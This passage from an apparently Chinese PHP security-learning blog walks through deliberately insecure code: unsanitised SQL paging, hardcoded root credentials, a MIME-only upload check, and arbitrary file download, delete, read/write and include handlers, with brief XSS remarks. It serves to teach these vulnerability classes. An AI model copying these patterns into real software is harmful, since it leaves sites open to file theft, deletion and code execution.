<span class="keyword">list</span>-style: none;</span><br><span class="line">            display: inline-block;</span><br><span class="line">        &#125;</span><br><span class="line">        a &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            width: <span class="number">100</span>px;</span><br><span class="line">            height: <span class="number">40</span>px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            line-height: <span class="number">40</span>px;</span><br><span class="line">            background: red;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            color: <span class="comment">#fff;</span></span><br><span class="line">            transition: all <span class="number">0.4</span>s <span class="number">0.1</span>s;</span><br><span class="line">        &#125;</span><br><span class="line">        a:hover &#123;</span><br><span class="line">            background: <span class="comment">#b60000;</span></span><br><span class="line">            color: yellow;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;index.php&quot;</span>&gt;首页&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;news.php&quot;</span>&gt;新闻&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;#&quot;</span>&gt;公司产品&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;#&quot;</span>&gt;关于我们&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;#&quot;</span>&gt;公司介绍&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>news.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;暗网新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到新闻模块&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 包含文件的操作，相当于调用某个php文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义每页显示的条数</span></span><br><span class="line"><span class="variable">$pageSize</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义当前页，通过地址栏传参得到$page参数来定义当前页</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])||<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]==<span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据公式计算limit需要的第一个参数</span></span><br><span class="line"><span class="variable">$start</span> = (<span class="variable">$page</span> - <span class="number">1</span>) * <span class="variable">$pageSize</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库查询语句</span></span><br><span class="line"><span class="variable">$sql0</span> = <span class="string">&#x27;select * from wordimg&#x27;</span>;</span><br><span class="line"><span class="variable">$max_num</span> = <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql0</span>));</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from wordimg LIMIT <span class="subst">$start</span> ,<span class="subst">$pageSize</span>;&quot;</span>;</span><br><span class="line"><span class="comment"># 数据库语句执行</span></span><br><span class="line"><span class="variable">$w</span> =  <span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment"># 获得执行结果的数组</span></span><br><span class="line"><span class="variable">$list</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$w</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出内容</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;<span class="subst">$value</span>[0]&lt;/h3&gt;&lt;p&gt;<span class="subst">$value</span>[1]&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$up</span> = <span class="title function_ invoke__">max</span>(<span class="number">1</span>, <span class="variable">$page</span> - <span class="number">1</span>);</span><br><span class="line"><span class="variable">$next</span> = <span class="variable">$page</span> + <span class="number">1</span>;</span><br><span class="line"><span class="variable">$next</span> = (<span class="variable">$max_num</span>/<span class="number">10</span>) &lt; <span class="variable">$next</span> ? (<span class="variable">$max_num</span>/<span class="number">10</span>) : <span class="variable">$next</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;?page=<span class="subst">$up</span>&#x27;&gt;上一页&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;?page=<span class="subst">$next</span>&#x27;&gt;下一页&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>conn.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbid</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$dbna</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$dbda</span> = <span class="string">&#x27;phpopen&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbid</span>,<span class="variable">$dbna</span>,<span class="variable">$dbpd</span>,<span class="variable">$dbda</span>);</span><br></pre></td></tr></table></figure><h1 id="PHP开发-文件下载-删除-读取-写入"><a href="#PHP开发-文件下载-删除-读取-写入" class="headerlink" title="PHP开发-文件下载/删除/读取/写入"></a>PHP开发-文件下载/删除/读取/写入</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、文件操作类代码编写<br>2、文件上传&amp;下载&amp;删除<br>3、文件内容&amp;读取&amp;写入<br>4、第三方编辑器引用实例</p><h2 id="各个类型"><a href="#各个类型" class="headerlink" title="各个类型"></a>各个类型</h2><h3 id="文件上传类：-任意文件上传"><a href="#文件上传类：-任意文件上传" class="headerlink" title="文件上传类：-任意文件上传"></a>文件上传类：-任意文件上传</h3><p>1、代码自主写–源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 表单</span></span><br><span class="line">&lt;form action=<span class="string">&quot;file_upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$rou</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="comment"># 文件后缀名拆分</span></span><br><span class="line">    <span class="comment"># $temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rou</span>))&#123;</span><br><span class="line">        <span class="variable">$err</span> = <span class="variable">$rou</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="variable">$err</span>&gt;<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="variable">$rou</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">            <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">            <span class="variable">$w</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$allowedExts</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;image/&#x27;</span>.<span class="variable">$val</span>==<span class="variable">$type</span>)&#123;</span><br><span class="line">                    <span class="variable">$w</span>++;</span><br><span class="line">                    <span class="variable">$size</span> = <span class="variable">$rou</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$size</span>&gt;<span class="number">100</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;大文件正在上传当中！&quot;</span>;</span><br><span class="line">                        <span class="variable">$path</span> = <span class="string">&#x27;./f&#x27;</span>;</span><br><span class="line">                        <span class="variable">$tmpname</span> = <span class="variable">$rou</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                        <span class="variable">$filename</span> = <span class="variable">$rou</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                        <span class="variable">$x</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$x</span>?<span class="string">&quot;上传成功&quot;</span>:<span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;文件太小啦！&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$w</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;文件类型有误！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$w</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;您的传入有误&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、编辑器引用–调用插件插入网站</p><p>编辑器自身的漏洞会影响到网站，核心代码在编辑器自身，而不是源代码。</p><blockquote><p>简单来说，源码再安全，也顶不住插件釜底抽薪。<br>验证的核心在插件上。</p></blockquote><p>3、框架类文件上传（暂略）</p><p>调用别人封装好的代码自己进行编译，关键点在于框架本身，有漏洞后也挡不住这种第三方捅娄子。</p><blockquote><p>验证的核心在框架上。</p></blockquote><h3 id="文件下载类：-任意文件下载"><a href="#文件下载类：-任意文件下载" class="headerlink" title="文件下载类：-任意文件下载"></a>文件下载类：-任意文件下载</h3><p>1、直连URL访问</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">利用网站无法解析对应的文件进行文件下载，如果是php文件就是直接执行php文件了</span><br><span class="line">形如：xiaodi8.com/file.zip</span><br><span class="line">可以调用herf进行下载</span><br></pre></td></tr></table></figure><p>2、传参头部修改</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">形如：xiaodi8.com/index.php?filename=file.zip</span><br></pre></td></tr></table></figure><p>源码泄露后有任意文件下载风险。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Downlond &lt;/h1&gt;</span><br><span class="line"><span class="comment">// 两种A标签直链</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./f/caidao.exe&quot;</span>&gt;点击下载文件&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;?filename=caidao.exe&quot;</span>&gt;点击下载文件&lt;/a&gt;</span><br><span class="line"><span class="comment">// 表单处理变量的直链下载</span></span><br><span class="line">&lt;form action=<span class="string">&quot;file_down.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;h4&gt;选择性下载文件&lt;/h4&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;点击下载&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 下载方式1：直连地址下载</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>]==<span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">geturl</span>(<span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">geturl</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&quot;/file/f/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载方式2：传参下载</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;GET&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&#x27;&#x27;</span>; <span class="comment">// 下载时的文件名，可以和实际文件名不同</span></span><br><span class="line">    <span class="variable">$file_path</span> = <span class="string">&#x27;/f/&#x27;</span>.<span class="variable">$file_name</span>; <span class="comment">// 文件路径</span></span><br><span class="line">    <span class="comment">#防自动执行和无参报错</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>||<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 打开文件</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_path</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">            <span class="comment">// 下载文件的大小</span></span><br><span class="line">            <span class="variable">$file_size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file_path</span>);</span><br><span class="line">            <span class="comment">// 设置 HTTP 响应头信息，告诉浏览器将要输出一个文件流</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=<span class="subst">$file_name</span>&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: <span class="subst">$file_size</span>&quot;</span>);</span><br><span class="line">            <span class="comment">// 循环读取文件并输出给浏览器</span></span><br><span class="line">            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">1024</span> * <span class="number">8</span>)); <span class="comment">// 每次输出 8KB</span></span><br><span class="line">                <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">                <span class="title function_ invoke__">flush</span>(); <span class="comment">// 将缓冲区的内容送到浏览器</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件删除类-任意文件删除"><a href="#文件删除类-任意文件删除" class="headerlink" title="文件删除类-任意文件删除"></a>文件删除类-任意文件删除</h3><p>1、文件删除<br>2、文件夹删除</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 任意文件删除：高危漏洞</span></span><br><span class="line"></span><br><span class="line">&lt;h5&gt;文件删除&lt;/h5&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;file_del.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    需要删除的文件/文件夹：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;删除&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>]==<span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;./f/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;删除开始……&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;路径信息有误&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">deleteDir</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteDir</span>(<span class="params"><span class="variable">$dirPath</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$dirPath</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$dirPath</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$dirPath</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dirPath</span>)) &#123;</span><br><span class="line">        <span class="variable">$dirPath</span> = <span class="variable">$dirPath</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="comment">#删文件夹下的文件</span></span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dirPath</span>),<span class="keyword">array</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">        <span class="variable">$hd</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$dirPath</span>);</span><br><span class="line">        <span class="keyword">while</span>((<span class="variable">$file_name</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$hd</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_name</span>!=<span class="string">&#x27;.&#x27;</span>&amp;&amp;<span class="variable">$file_name</span>!=<span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$file_path</span> = <span class="string">&quot;<span class="subst">$dirPath</span><span class="subst">$file_name</span>&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">deleteDir</span>(<span class="variable">$file_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$hd</span>);</span><br><span class="line">        <span class="comment"># 删除文件夹本身</span></span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$dirPath</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件内容操作类-任意文件读取-amp-写入"><a href="#文件内容操作类-任意文件读取-amp-写入" class="headerlink" title="文件内容操作类-任意文件读取&amp;写入"></a>文件内容操作类-任意文件读取&amp;写入</h3><p>1、文件读取<br>2、文件写入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    textarea &#123;</span><br><span class="line">        width: <span class="number">500</span>px;</span><br><span class="line">        height: <span class="number">600</span>px;</span><br><span class="line">        resize: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&#x27;./f/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="variable">$x</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./f/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$p</span>,<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;file_rw.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    读取指定文件：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;path&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;读取&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;file_rw.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;p&quot;</span> value=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$path</span>;<span class="meta">?&gt;</span> &gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;text&quot;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$x</span><span class="meta">?&gt;</span>&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;修改&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="文件包含-任意文件包含"><a href="#文件包含-任意文件包含" class="headerlink" title="文件包含-任意文件包含"></a>文件包含-任意文件包含</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>1、本地文件包含<br>2、远程文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件包含：包含即执行，脚本执行</span><br><span class="line"></span><br><span class="line">函数会执行<span class="number">1</span>.txt里面的php代码</span><br><span class="line"><span class="keyword">include</span>(<span class="number">1</span>.txt);</span><br><span class="line"></span><br><span class="line">形如：</span><br><span class="line">url: http:<span class="comment">//www.baidu.com/index.php?path=flag.php</span></span><br><span class="line"></span><br><span class="line">index.php内：</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">这就是包含执行。假如传入的flag.php为后门，就变成了一个文件包含漏洞。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="文件包含函数："><a href="#文件包含函数：" class="headerlink" title="文件包含函数："></a>文件包含函数：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>() <span class="comment">// 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>() <span class="comment">// 如果一个文件已经被包含过，则不会在包含它</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>() <span class="comment">// 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>() <span class="comment">// 如果一个文件已经被包含过，则不会在包含它</span></span><br></pre></td></tr></table></figure><h2 id="Web漏洞核心："><a href="#Web漏洞核心：" class="headerlink" title="Web漏洞核心："></a>Web漏洞核心：</h2><p>1、可控变量 - 变量修改与拼接<br>2、特定函数 - 函数的多样化 - 常见函数漏洞绕过等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直链地址无法更改的原因：不是变量</span><br></pre></td></tr></table></figure><h1 id="PHP开发-输入输出留言板访问获取"><a href="#PHP开发-输入输出留言板访问获取" class="headerlink" title="PHP开发-输入输出留言板访问获取"></a>PHP开发-输入输出留言板访问获取</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点:"></a>知识点:</h2><p>1、PHP-全局变量$_SERVER<br>2、MYSQL-插入语法INSERT<br>3、输入输出-XSS&amp;反射&amp;存储<br>4、安全问题-XSS跨站&amp;CSRF等</p><h2 id="PHP本地搜索"><a href="#PHP本地搜索" class="headerlink" title="PHP本地搜索"></a>PHP本地搜索</h2><p>可以传入JS，利用JS进行攻击。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;file.php&quot;</span> meathod=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;word&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;搜索&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 